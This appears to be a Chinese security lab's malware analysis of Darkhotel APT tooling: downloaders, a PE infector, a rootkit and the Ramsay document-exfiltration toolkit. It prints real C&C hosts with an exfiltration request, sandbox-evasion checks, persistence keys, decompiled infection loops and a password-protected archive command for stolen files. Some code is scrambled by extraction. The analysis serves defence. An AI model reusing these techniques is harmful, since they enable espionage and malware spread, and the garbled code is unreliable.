@@ -1,0 +1,310 @@
+2020-08-13 $\mathcal{O}$ 伏影实验室 $\Bumpeq$ APTGroup,Darkhotel,中间组件，伏影实验室，感染传播  
+
+$\textcircled{4}$ 阅读：36  
+
+# 一、手法简述  
+
+Darkhotel组织攻击链中使用的注入和中间下载组件，目的是为了得到下一阶段程序。这类组件类型从可执行文件到脚本不等，通常包含大量环境检测，以对抗调试环境和软。  
+
+Darkhotel还使用专门的升级工具，用于升级攻击链末端的RAT和窃密组件，这与传统RAT自身集成更新功能有所不同。  
+
+此外，使用感染类和传播类工具亦是Darkhotel的一大特色，这直接延升了该组织的攻击范围。  
+
+# 二、中间执行工具  
+
+## 2.1注入器  
+
+### 2.1.1环境检查  
+
+注入器执行时会进行时间年份检查，若满足则执行后续动作，不满足则退出。之后通过LZNT1算法解压部分内存数据并校验。  
+
+随后对运行环境进行一系列检查，检测包括Mutex存在性，文件名是否为Hash值，是否运行于VMware、Sandbox、Cuckoo、Avast等虚拟机或沙箱环境，是否有其他分析进程存在。  
+
+通过检查目录"c:\avast!sandbox"来检测Avast沙箱。  
+
+通过检查SbieDIl.dll来检测Sanboxie沙箱。  
+
+通过检查管道\.lpipe\cuckoo来检测Cuckoo沙箱。  
+
+通过设备检查来检测是否运行于VMware环境。  
+
+通过检查特定进程如Filemon.exe和Regmon.exe来检测Windowssysinternals等套件。  
+
+### 2.1.2持久化  
+
+使用COM组件IShelLink，于自启动菜单下创建名为WindowsUpdate的软链接，并在以下注册表项位置设置自启动键：  
+
+Software\Microsoft\Windows NT\CurrentVersion\Windows Software\Microsoft\Windows\CurrentVersion\Run Software\Microsoft\Windows\CurrentVersion\Policies\ExplorerRun  
+
+### 2.1.3注入  
+
+先经过3DES解密内存数据再经LZNT1解压得到dIl，将其注入进程，包括：  
+
+wksprt.exe、taskhost.exe、dwm.exe、sdiagnhost.exe、winrshost.exe、wsmprovhost.exe、ctfmon.exe、 explorer.exe  
+
+## 2.2HTA下载组件  
+
+Darkhotel在10年前就开始使用HTA文件在目标系统上植入恶意程序。  
+
+刀始hta文档采用在body内置脚本，脚本使用url编码，通过eval执行代码，所执行代码为嵌套式hta，如此往复  
+
+重复多次解码操作，我们最终得到如下js脚本：  
+
+  
+
+脚本内置16进制字符数组通过逐字节与0x3D异或，得到完整的可执行文件，并写入系统Temp文件夹下，名称为internet_explorer_Smart_recovery.exe，后通过shell将其运该可执行文件作为下载器，首次运行会分段解密并将bat命令写入隐藏文件并重命名执行，目的是实现自删除。  
+
+@echooff   
+:Rept   
+del /f "C:\Users\xxx-win7\Desktop\download.bin"   
+if exist "C:\Users\xxx-win7\Desktop\download.bin" goto Rept   
+del /f /ah "C: \Users\xxx-W\~1\AppData\Local\Temp\logEDE.tmp.bat"  
+
+同时解密出C&C地址，带参数执行进程创建任务，总计3个参数，格式为：  
+
+Argv1:^zoqr.Argv2: http://sendspace. servermsys. com/wnctprxArgv3: C:\Users\XXX-W\~1\AppData\Local\Temp\1ogF25A. tmp其中，Argv1为硬编码字串，Argv2为下载链接，Argv3为待下载文件名。若程序带参运行，则进入下载流程，并删除下载自身的HTA文件。  
+
+# 三、组件升级工具  
+
+## 3.1微下载器  
+
+Darkhotel在2014年使用过一类微下载器，由WinRarSFX自解压文件释放，专门用于升级恶意组件。这类下载器与后文提到的Karba下载器共用了部分代码，可视为是Karba器的简化版。  
+
+### 3.1.1持久化&环境检测  
+
+下载器会将为当前可执行文件注册为自启动项：  
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce这类下载器在连接C&C之前，会检查之前的组件信息，使用指定字节覆盖，为取证制造困难。示例目录如下：  
+
+%APPDATA%\Microsoft\Crypto\DES64v7\dtlcntr. exe %APPDATA%\Microsoft\Crypto\DES64v7\googletoolbar. exe %APPDATA%\Microsoft\Crypto\DES64v7\active. dl1 %APPDATA%\Microsoft\Crypto\DES64v7\detect. dl1  
+
+其中的googletoolbar.exe暗示了该组织在谷歌工具栏升级包中植入后门。  
+
+此外，下载器还存在延时操作，例如查找当前目录下是否存在某个文件，没有则正常连接C&C。若文件存在，且创建时间距今已超过指定时间，则同样使用指定字节覆盖，不发生任何下载升级行为。  
+
+3.1.2C&C通信下载行为分为两个阶段。  
+
+第一阶段先请求，向第一个C&C发起HTTP请求，返回的内容需包含符合以下正则格式：  
+
+  
+
+其中，数字和点部分代表IP地址。若不符合格式，则更换C&C和资源路径反复下载。此外，是否一次连接成功并得到正确格式的数据也会影响C&C和请求资源的组合。  
+
+第二阶段，检查C&C返回的IP是否为本机地址，即判断本机与C&C发生通信的是否为外网地址。检查的结果同样会导致下一步连接的C&C和请求资源发生变化。接收内容白如下：  
+
+<html><body><table><tr><td>格式</td><td>含义</td></tr><tr><td>DEXT87no”）（“DEXT87\x00”</td><td>返回第一阶段再发起连接</td></tr><tr><td>“DEXT87up”）filelen;filebin</td><td>后续内容包含PE组件</td></tr></table></body></html>  
+
+对"DEXT87up"后面的内容按分号切割，分号前面为文件长度，后面为经过简单异或加密的PE文件。解密的PE文件被保存在当前目录并被执行。之后下载器将睡眠3000秒来后对该PE使用指定字节进行覆盖，之后再重复上述通信行为。这表明下载的可执行程序具有时效性，因此需要不断更新。  
+
+## 3.2 Karba下载器  
+
+### 3.2.1功能性质  
+
+Karba下载器是微下载器的升级版，区别在于更多的信息收集和环境监测，通信协议也有变化。  
+
+### 3.2.2持久化&环境检测  
+
+1.检查注册表自启动项，若未发现自身文件名则进行注册：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  
+
+2.检测是否处于VMWare且网段是否为192.168.100，若是则退出程序。同时，下载器删除当前目录下所有后缀为exe的可执行文件，以隐藏旧组件痕迹。  
+
+3.检测杀软名进程名单，在上传到C&C时使用预置的杀软缩写和索引位。若检测到多个杀软，则其索引号之间由 $+$ 号连接，若未检测到任何指定杀软，则保留一个 $^{\cdot+}$ 号。  
+
+<html><body><table><tr><td>杀软</td><td>代号</td></tr><tr><td>AYAgent.aye</td><td>AY</td></tr><tr><td>V3LTray.exe</td><td>V</td></tr><tr><td>avp.exe</td><td>KS</td></tr><tr><td>bdagent.exe</td><td>BD</td></tr><tr><td>ccsvchst.exe</td><td>NT</td></tr><tr><td>avgidsagent.exe</td><td>AV</td></tr><tr><td>mcagent.exe</td><td>MC</td></tr><tr><td>RsMgrSvr.exe</td><td>RS</td></tr><tr><td>AvastSvc.exe</td><td>AST</td></tr><tr><td>uiWinMgr.exe</td><td>TR</td></tr><tr><td>msseces.exe</td><td>MS</td></tr><tr><td>360tray.exe</td><td>36</td></tr><tr><td>NVCAgent.npc</td><td>NV</td></tr><tr><td>ekrn.exe</td><td>NOD</td></tr></table></body></html>  
+
+### 3.2.3搜集系统信息  
+
+搜集计算机名称和用户名。  
+
+访问注册表，搜集CPU名称、系统语言id和系统版本编号信息，格式化后做简单加密和Base64编码用来上传。  
+
+HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\Sys tem\CentralProcessor\0\  
+ProcessorNameString  
+Identifier  
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language\InstallLanguage  
+HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CurrentVersion\  
+CSDVersion  
+ProductName  
+CurrentVersion  
+
+根据语言代称，初始化不同的字符串用于后续发送：  
+
+<html><body><table><tr><td>代号</td><td>语言</td></tr><tr><td>step2-down-k</td><td>韩文</td></tr><tr><td>step2-down-j</td><td>日文</td></tr><tr><td>step2-down-u</td><td>英文（美国）</td></tr><tr><td>step2-down-r</td><td>俄文</td></tr><tr><td>step2-down-c</td><td>中文（中国大陆）</td></tr></table></body></html>  
+
+在当前目录查找名为proto.dat文件，该文件包含的加密的短字符串，用于选择C&C。  
+
+<html><body><table><tr><td>解密前</td><td>解密后</td></tr><tr><td>BBG</td><td>5</td></tr><tr><td>BBV</td><td>6</td></tr><tr><td>BBW</td><td></td></tr><tr><td>BBJ</td><td></td></tr><tr><td>BBK</td><td></td></tr></table></body></html>  
+
+3.2.4C&C通信  
+
+该组件根据proto.dat中BBX字符串的索引号来选择C&C，使用HTTPURL参数来上传搜集的信息，成分如下：  
+
+1.C&C索引引和系统语言代称，为BB?字符串解密后的数值加上语言代称"step2-down-？”  
+2.MAC地址的hash值。  
+3.加密后的系统信息。  
+4.杀软索引列表。  
+
+请求参数的格式为：  
+
+/bin/read_i.php?a1= cnc_index_lang_alias&a2=mac_addr_hash&a3=encrypted_info&a4=av_index  
+
+GET /bin/read_i.php?   
+a1=SE1h0zwiN3pQKiAPFWcq&a2=448a60191f8f5f31c03166fed72bacac&a3=RBsidmgUPjtdGzwdCWp ybAYaMwVjGQQMFgkVJW1jfX1IQH10KjV5aD5ubyhbah1sbHNcAiA9IiBUKFNrDiQ/KFAtHWFoLnB1Snl/ SFsJGB1sCVx4YH93CzQAUgUCHXx/   
+Jzc1PxcFbnQfPHFYKDM70CkkXAQdc2cbFRQeJDo4bXpYLDw8ISomPBhuZyseOD41LyxcGy8qLGxNU0YpP3 VtGCs7cAsnMik8R25/   
+RBk4dmwaKB9rdG17Lg5EWgUoP20uGQs0aHJndn9PYH50VXtxdGJ4T39uaW98TEo5eXR9en87TGFhdCU1dg ==&a4=+ HTTP/1.1   
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0) Host: greenlabelstud.000space.com   
+Connection: Keep-Alive   
+Cache-Control: no-cache  
+
+返回的内容需包含某个特定字符串方可有效，例如"minmei"。之后紧接指令：  
+
+<html><body><table><tr><td>指令</td><td>含义</td></tr><tr><td>re</td><td>选择下一个C&C重新下载</td></tr><tr><td>no</td><td>向proto.dat写入当前C&C对应的BB?字符串，然后退出程序</td></tr><tr><td>up</td><td>向proto.dat写入当前C&C对应的BB？字符串，解密PE文件并执行</td></tr></table></body></html>  
+
+若接收up，则对后面的内容按分号分割，分号前面的是文件长度，后面是加密的内容：  
+
+# ("minmeiup")filelen; filebin  
+
+可见，这很接近前文微下载器的协议。  
+
+# 四、感染&横向移动  
+
+## 4.1 Pioneer组件  
+
+4.1.1功能  
+
+ioneer组件见于2014年，专用于感染用户磁盘上的特定PE文件，注入恶意代码以实现后续攻击。  
+
+### 4.1.2环境检测  
+
+该组件创建互斥体保证唯一进程实例，执行I/O指令和查看网段来检测VMware，并检查用户所在内网网段，若属于192.168.100，则退出程序。  
+
+### 4.1.3感染PE文件  
+
+该组件创建一个窗口，每次收到消息时都会实施感染PE文件的操作，记录遍历的盘符。该组件寻找本地硬盘，并记录USB的盘符名称和编号。  
+在遍历目录同时，专门对名称中包含"INSTALL"、"SETUP"和"UPDATE"的PE文件进行感染。这类文件多半是安装或升级包，可能被再次运行，故容易受到攻击者的利用。  
+
+case3u: //DRIVE_FIXED if（!drive_fixed_found_num) _beginthread((int)thread_infect,0,(int)disk_pathname); sprintf(&FileName，"\1ll?\1%c:"，v0_drive_cur_id+'A');// \\?\D:  
+
+while（FindNextFileA(v3，&FindFileData）) if（count>999） break; if（FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { if （ strcmp(FindFileData.cFileName,".") && strcmp(FindFileData.cFileName,"..") && index $\rightleftharpoons$ 1000) { sprintf(&v14_file_path,"%s\\%s\\\*.\*",v2_disk_name,FindFileData.cFileName); v9 $=$ &disk_path_wildcard[260 \* index]; v10 = &v14_file_path; ++index; do strcpy(v15_exe, ".exe"); { strcpy(v16_specified_name, "INSTALL"); v11 = \*v10; strcpy((char \*)&v17_SETUP, "SETUP"); \*v9++=\*v10++; $\vee18=\theta$ } strcpy((char \*)&v19_UPDATE,"UPDATE"); while （v11 ); $\vee22=\Theta;$ else { sprintf(&v14_file_path, "%s\\%s", v2_disk_name, FindFileData.cFileName); v8 = infect_pe(&v14_file_path); if （ v8 == 0xF60 ) { sleep(0x64u); ++count;  
+
+感染时，该组件在内存中创建原文件副本并插入一个名为"rdat"的新节区并覆盖原文件，并修改入口点，同时在当前目录创建文件（例如repnum.dat）以记录被感染文件白数。  
+
+如图所示，被感染的PE文件多出一个节：  
+
+<html><body><table><tr><td>Nr</td><td>Virtualoffset</td><td>Virtual size</td><td>RAWDataoff...</td><td>RAWsize</td><td>Flags</td><td>Name</td><td>First bytes (hex)</td></tr><tr><td>01im</td><td>00001000</td><td>00053000</td><td>00000400</td><td>00052E00</td><td>60000020</td><td>.text</td><td>680482730857887329</td></tr><tr><td>02</td><td>00054000</td><td>00005000</td><td>00053200</td><td>00004200</td><td>C0000040</td><td>.data</td><td>362F01010000000000</td></tr><tr><td>03rs</td><td>00059000</td><td>00063000</td><td>00057400</td><td>00062800</td><td>40000040</td><td>.rsrc</td><td>000000000000000000</td></tr><tr><td>04</td><td>DOOBCOOO</td><td>00004000</td><td>000B9C00</td><td>00003C00</td><td>42000040</td><td>.reloc</td><td>00100000B400000041</td></tr><tr><td>05ep</td><td>00000000</td><td>00001400</td><td>000BD800</td><td>00001400</td><td>E0000040</td><td>.rdat</td><td>6C2D01012C7D61642C</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table></body></html>  
+
+被感染程序执行时，先执行.rdat中的Shellcode，再跳回原来的入口点执行。Shellcode中包含了加密的PE组件、组件名、释放路径和注册表自启动项路径等信息。  
+
+#  
+
+  
+
+  
+
+Shellcode会解密PE组件并释放至指定目录，并注册为自启动项，同时删除指定PE文件的注册表项（可能是之前的组件，如tintsetp.exe），启动释放的组件后便执行被感染的正常流程。  
+
+### 4.1.4持续感染  
+
+感染PE文件的组件会监视USB设备插入拔出的情况。  
+
+若监测到USB设备插入，则该组件则会前往之前遍历的最后一个盘符进行感染操作。如果遍历最后的盘符为USB且与当前插入盘符相同，则USB中PE文件将可能被感染。不移除时，该组件将重复上文操作对本地磁盘再次发起感染操作。不过，这只针对WindowsXP及以下版本，再次表明攻击具有定向性。  
+
+此外，该组件还监控用户目录C:\Windows\Users\username及其子目录下的文件变化情况，包括文件和目录的创建、删除和重命名。  
+
+for ( result $=$ ReadDirectoryChangesW((HANDLE)\*v4_info_buf, v4_info_buf $^+$ 0x43, 0x2000u, 1, 3u,v4_info_buf $^+$ 2, 0, 0); result; result $=$ ReadDirectoryChangesW((HANDLE)\*v4_info_buf, v4_info_buf $^+$ 0x43，0x2000u，1,3u,v4_info_buf $+2$ ，0，0) v4_info_buf[0x843] $=$ (DIWORD)(v4_info_buf $^+$ 0x43);// FILE NOTIFY_INFORMATION memcpy(&v15, v4_info_buf $^+$ 0x46，v4_info_buf[0x45]);// 复制发生改变的文件的名称 \*（int16\*)（（char\*）&v15 $^+$ \*(_DWoRD \*)(v4_info_buf[2115] $1+8))=9;$ wsprintfA(&v16,"%s", &v15); sprintf（&changed_file_path，"%s%s"，&user_path，&v16);// 发生改变的文件路径 if (\*(_DWORD \*)(v4_info_buf[2115]+ 4) $\scriptstyle==1$ && is_special_dir(&changed_file_path) $\scriptstyle=={\frac{1}{2}}$ )//若有新文件出现在指定目录 { EnterCriticalSection(&CriticalSection); V7 = infect_pe(&changed_file_path); $11$ 查找可感染的PE文件 if（v7 == 0x63) { sleep(0x64u); V7 = infect_pe(&changed_file_path); } v11=0; do { if （v7 != -2 && v7 != -3 && v7 != -20 |l !PathFileExistsA(&changed_file_path) ) break; sleep(0x12Cu); V7 = infect_pe(&changed_file_path); if （v7==99) { sleep(0x64u); v7 = infect_pe(&changed_file_path);  
+
+若监测到变动，且文件为包含"INSTALL"、"SETUP"和"UPDATE"的PE文件，并位于常用特定子目录，则发起前文所述的感染操作。涉及的子目录名如下：  
+
+  
+
+## 4.2 Ramsay组件集  
+
+### 4.2.1功能  
+
+Darkhotel在2020年4月被发现使用Ramsay组件集在隔离网络中感染文档，以存放收集的信息。  
+
+### 4.2.2释放组件  
+
+本次事件获取的样本为被RamsayV2感染的7z安装程序，并不是最初的样本，显示有效数据外包含额外数据。  
+
+  
+
+被感染的文件会被添加一个Dropper，负责释放后续的一系列功能组件：  
+
+Dropper运行以后先创建目录%APPDATA%\Microsoft\UserSetting\，然后检查命令行参数是否为"gQ9VOe5m8zP6，若是则开始从自身读取内容释放其他功能组件  
+
+释放的组件及功能：  
+
+<html><body><table><tr><td>路径及名称</td><td>功能</td></tr><tr><td>%temp%随机名.exe</td><td>开源工具UACME，bypasS UAC</td></tr><tr><td>%system32%\identities\wideshut.exe</td><td>dropper 副本</td></tr><tr><td>%system32%\identities\sharp. exe</td><td>WinRAR官方主程序</td></tr><tr><td>%system32%\identities\bindsvc.exe</td><td>感染本地和内网共享中的exe，突破网络隔离</td></tr><tr><td>%system32%\drivers\hfile.sys</td><td>内核Rookit，用于隐藏文件</td></tr><tr><td>%system32%msfte.dl1(32 64)</td><td>窃密打包CVE-2017-0147漏洞扫描基于文件传输的C2通讯</td></tr><tr><td>%system32%\oci.dl1（64 32)</td><td></td></tr><tr><td>%system32%wimsvc.exe</td><td>Dropper 副本</td></tr></table></body></html>  
+
+### 4.2.3 感染PE bindsvc.exe  
+
+bindsvc.exe的主要功能是实现横向移动，通过感染非系统盘和内网网络共享中的可执行性文件，等待被感染程序被攻击目标触发。感染的结果与本次发现的7z样本一致。  
+执行程序，等待在内网中传播。  
+
+### 4.2.4 Rookit组件Hfile.sys  
+
+Hfle.sys是一个32位驱动程序。通过分析发现，该驱动在内部被称为HideDriver，通过对SSDT表中函数ZwQuerySystemlnformation和ZwQueryDirectoryFile挂钩，实现双和进程隐藏的功能。  
+
+ZwQuerySystemlnformation的hook函数会处理SystemProcesslnformation对应的返回数据。而ZwQueryDirectoryFile的hook函数则对文件相关的操作进行处理，涉及操包括：  
+
+  
+
+此外，通过控制码，可对文件和进程隐藏做进一步操作。例如，控制码0x222404可用来在宽字符的进程或文件路径后面增加"；\*；\*”：  
+
+wsprintfW(&string,L"%s\iSystem32\%s;\*;\*",u10,L"wimsuc.exe");   
+y11 $=$ lstrlenW(&string);   
+DeviceIoControl_6AC31ABθ(0x222404u, &String,2 \*v11 + 2);   
+memset(&string, 0, 0x208u);   
+lstrcpyw(&string, L"sharp-exe;\*;\*");   
+y12 $=$ lstrlenw(&string);   
+DeviceIoControl_6AC31ABθ(θx222004u, &String,2 \* v12 + 2);  
+
+wimsvc.exe文件隐藏前后示例截图：  
+
+  
+
+所有控制码及功能如下：  
+
+<html><body><table><tr><td>控制码</td><td>功能</td></tr><tr><td>0x222404</td><td>增加隐藏文件规则</td></tr><tr><td>0x222408</td><td>删除隐藏文件规则</td></tr><tr><td>0x22240C</td><td>删除全部隐藏规则</td></tr><tr><td>0x222410</td><td>查询隐藏文件规则</td></tr><tr><td>0x222004</td><td>增加隐藏进程规则</td></tr><tr><td>0x222008</td><td>删除隐藏进程规则</td></tr><tr><td>0x22200C</td><td>删除所有隐藏规则</td></tr><tr><td>0x222010</td><td>查询隐藏进程规则</td></tr></table></body></html>  
+
+### 4.2.5多功能组件msfte.dll/oci.dll  
+
+该组件包含32位和64位，通过对文件内容分析，文件于内部被命名为Ramsay。  
+
+msfte.dll被释放到系统system32目录下，会劫持系统服务WSearch，被系统程序SearchSystemHost.exe以系统权限运行。  
+
+#### 4.2.5.1感染文档  
+
+为了在隔离网络中进行活动，该组件通过文档进行自定义的传输和指令控制功能，方式是将信息附加到文档，等待时机传送出去。一旦这些文档到达已被攻击者植入了后门机时，相关后门会找到有附加信息的文档并将之取出，回传至C&C，同时读取运行文档中的隐藏程序。  
+
+通过释放winword.vbs以获取最近文档中的文本内容。访问Windows Recent目录，窃取最近文件并使用组件sharp.exe（WinRAR）进行打包，密码为PleaseTakeOut6031416!!@@##:  
+
+C:\Windows\System32\Identities\sharp.exe a -r -s -rp -ep -hp[password] -ta[date]"%appdata%\Microsoft\UserSetting\xxxx\Contents_%S. db” "%appdata%\Microsoft\Windows\Recent\\*. lnk  
+
+判断当前模块是否已注入HYON.exe、BON.exe或Cover.exe进程中，目前无法判定其为何种工具。  
+
+读取文档中的隐藏程序并运行，并将自身注入explorer.exe。  
+
+#### 4.2.5.2搜集系统信息  
+
+msfte.dll会将自身注入explorer.exe，并将版本号写入version.ini文件，通过一系列命令获取系统信息。这些信息经过加密，保存到%APPDATA%\Microsoft\UserSetting\MediaCache\目录下的rtt文件中。  
+
+通过以下命令搜集进程、系统和网络信息，并检查自身模块：  
+
+  
+
+# 其他的搜集行为还包括：  
+
+·IE浏览器网络缓存目录中的文档文件（.txt\.doc\.xls）。  
+·当前机器磁盘、目录和文件信息。  
+·创建名为lua的窗口，并设置回调函数，当有可移动存储设备接入时，采集相应的信息。  
+·内网共享目录扫描，除了获取共享目录和文件相关信息外，还试图搜集目录中的.txt.doc.xls文档文件。  
+
+此外，该组件会在内网中扫描永恒之蓝漏洞中的CVE-2017-0147，但只是发送畸形数据包，并未利用。  
+
+# 五、总结  
+
+升级功能从RAT中独立出来并加入清理功能，使得该组织得以不断更新组件，以及时调整后续攻击的方案  
+
+此外，该组织对PE感染和文档感染工具的利用扩大了攻击范围，使得隔离环境下的木马传播和信息传递得以实现。而利用文档移动来转移内容，并让相关组件潜伏在内部中以等待时机，表明该组织掌握了目标所处的网络环境和活动规律，计划之周详，绝非短期之谋。  
